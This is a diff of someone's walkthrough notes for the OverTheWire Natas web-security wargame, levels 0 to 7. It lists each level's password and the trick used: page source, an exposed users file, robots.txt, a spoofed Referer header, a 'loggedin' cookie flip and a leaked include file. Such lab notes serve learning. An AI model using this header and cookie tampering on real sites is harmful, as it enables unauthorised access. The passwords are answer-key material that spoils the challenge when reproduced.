@@ -1,4 +1,4 @@
-lvl 1:
+lvl 0:
 -----------
 http://natas0.natas.labs.overthewire.org/
 natas0 : natas0
@@ -6,29 +6,117 @@ natas0 : natas0
 
 lvl 1:
 -----------
+ctrl + U 
+<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
+
+
 
 lvl 2:
 -----------
+ctrl + U
+<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->
 
 
 lvl 3:
 -----------
+ctrl + U
+->
+http://natas2.natas.labs.overthewire.org/
+->
+<img src="files/pixel.png">
+->
+http://natas2.natas.labs.overthewire.org/files
+->
+http://natas2.natas.labs.overthewire.org/files/users.txt
+->
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+->
+G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+
 
 lvl 4:
 -----------
+http://natas3.natas.labs.overthewire.org/robots.txt
+->
+User-agent: *
+Disallow: /s3cr3t/
+->
+http://natas3.natas.labs.overthewire.org/s3cr3t/
+->
+http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+->
+natas4 : tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+
 
 
 lvl 5:
 -----------
-
+open burp
+->
+change refered in request from
+->
+Referer: http://natas4.natas.labs.overthewire.org/
+->
+to
+->
+Referer: http://natas5.natas.labs.overthewire.org/
+->
+Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD 
 
 
 lvl 6:
 -----------
+open burp
+->
+Cookie: loggedin=0
+->
+Cookie: loggedin=1
+->
+ Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+
 
 
 lvl 7:
 -----------
+click View sourcecode
+->
+
+<?
+
+include "includes/secret.inc";
+
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+        print "Access granted. The password for natas7 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+    }
+?>
+
+->
+include "includes/secret.inc";
+->
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+->
+ctrl + U
+->
+<?
+  $secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+
+->
+enter in input secret 
+->
+Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr 
+->
+
 
 
 lvl 8:
